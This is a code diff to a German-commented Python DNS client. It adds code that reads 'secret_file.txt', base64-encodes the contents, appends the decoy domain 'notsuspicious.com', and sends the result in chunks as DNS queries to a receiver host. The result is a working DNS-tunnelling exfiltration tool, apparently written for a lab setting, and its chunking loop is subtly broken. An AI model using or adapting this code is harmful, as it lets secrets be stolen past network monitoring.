@@ -1,3 +1,4 @@
+import base64
 import socket
 from time import sleep
 import dns.message
@@ -7,6 +8,16 @@ import dns.rdatatype
 import dns.rdataclass
 import dns.rdata
 
+
+def read_file(filename):
+    secret_file = open(filename,"r")
+    return(str(secret_file.read()))
+
+
+def dns_compose(text,domain):
+    return(str(base64.b64encode(text.encode('utf-8')))+domain)
+
+  
 
 def send_minimal_dns_request(server_ip, domain, port):
     # Stelle sicher, dass der Domainname absolut ist
@@ -34,7 +45,6 @@ def send_minimal_dns_request(server_ip, domain, port):
         except socket.timeout:
             print("No response received (Timeout)")
 
-
 def print_records(response, record_type):
     records = []
 
@@ -56,10 +66,20 @@ def print_records(response, record_type):
         print(f"No {dns.rdatatype.to_text(record_type)} records found.")
 
 
+
 if __name__ == "__main__":
     receiver_ip = "172.36.0.3"  # Ändere dies in die IP des Empfängers, falls notwendig
-    domain_name = "justus-sieger.de"
-    for i in range(100):
+    domain_base = "notsuspicious.com"
+    secret_text = read_file("secret_file.txt")
+    domain_name = dns_compose(secret_text,domain_base)
+    for i in range(1,(100+len(domain_name))//50):
         sleep(5)
-        print(f"Sending DNS request {i + 1}/100")  # Zähle die Anfragen mit
-        send_minimal_dns_request(receiver_ip, domain_name, 12345)
+        if len(domain_name)>=50*(i+1):
+            current_domain = domain_name[i*50:(i+1)*50]
+        elif len(domain_name)>=50*(i+2):
+            current_domain = domain_name[i*50:-1]
+        else:
+            print("ERROR:Index went past Domain Name length")
+            break
+        print(f"Sending DNS request {i}")  # Zähle die Anfragen mit
+        send_minimal_dns_request(receiver_ip, current_domain, 12345)
